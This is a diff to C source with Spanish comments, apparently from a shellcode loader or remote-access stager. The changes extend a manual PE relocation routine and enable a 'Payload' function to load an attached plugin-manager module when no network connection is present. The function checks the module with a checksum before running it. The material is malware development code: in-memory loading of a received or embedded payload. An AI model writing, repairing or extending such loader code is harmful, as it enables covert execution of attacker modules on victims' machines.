@@ -131,8 +131,7 @@ void FinalizeSections(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module){
 	}
 }
 
-void PerformBaseRelocation(PMEMORYMODULE module, DWORD delta){
-	DWORD i;
+void PerformBaseRelocation(PMEMORYMODULE module, int delta){
 	unsigned char *codeBase = module->codeBase;
 
 	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_BASERELOC);
@@ -147,19 +146,24 @@ void PerformBaseRelocation(PMEMORYMODULE module, DWORD delta){
 			unsigned char *dest = (unsigned char *)(codeBase + relocation->VirtualAddress);
 			unsigned short *relInfo = (unsigned short *)((unsigned char *)relocation + sizeof(IMAGE_BASE_RELOCATION));
 
-			for (i=0; i<((relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD)); i++, relInfo++){
-				DWORD *patchAddrHL;
-				int type, offset;
-
+			for (int i=0; i<((relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD)); i++, relInfo++){
 				//Los 4 bits superiores establecen el tipo de relocalizacion
-				type = *relInfo >> 12;
+				int type = *relInfo >> 12;
 				//y los 12 inferiores el offset
-				offset = *relInfo & 0xfff;
-				
-				if (type == IMAGE_REL_BASED_HIGHLOW){
-					//Actualizamos los 32bits
-					patchAddrHL = (DWORD *)(dest + offset);
-					*patchAddrHL += delta;
+				int offset = *relInfo & 0xfff;
+
+				switch(type){
+                case IMAGE_REL_BASED_ABSOLUTE:
+                    break;
+                case IMAGE_REL_BASED_HIGH:
+                    *(short*)((char*)dest + offset) += HIWORD(delta);
+                    break;
+                case IMAGE_REL_BASED_LOW:
+                    *(short*)((char*)dest + offset) += LOWORD(delta);
+                    break;
+                case IMAGE_REL_BASED_HIGHLOW:
+                    *(int*)((char*)dest + offset) += delta;
+                    break;
                 }
 			}
 
@@ -500,11 +504,10 @@ void Payload(PSHELLCODE_CONTEXT scc){
         }
         if (last_err == WSAENOTCONN){
             //TO DO: LEER PLUGINMANAGER ADHERIDO
-            /*bBuff = (char*)(delta + ((PBYTE)main - (PBYTE)Start));
-            dwDSize = *(DWORD*)(delta + ((PBYTE)main - (PBYTE)Start) - 4);
+            bBuff = (char*)(scc->delta + (PBYTE)main);
+            dwDSize = *(DWORD*)((PBYTE)bBuff - 4);
             dwSize = dwDSize;
             bReceived = true;
-            */
         }else{
             return;
         }
@@ -521,7 +524,7 @@ void Payload(PSHELLCODE_CONTEXT scc){
         for(DWORD i = 0; i < dwSize-4;i++){
             nChecksum ^= (BYTE)bBuff[i];
             nChecksum *= 0x1EF30EB;
-        };
+        }
 
         //Si el checksum coincide
         if (nChecksum == oChecksum){
@@ -618,7 +621,7 @@ get_delta:
 
 //Valor escrito por el PM en caso de haber sido guardado offline
 //Éste establece el tamaño del PM
-void PM_SIZE(){
+void __declspec(naked) PM_SIZE(){
     __asm __emit 0x0;__emit 0x0;__emit 0x0;__emit 0x0;
 }
 
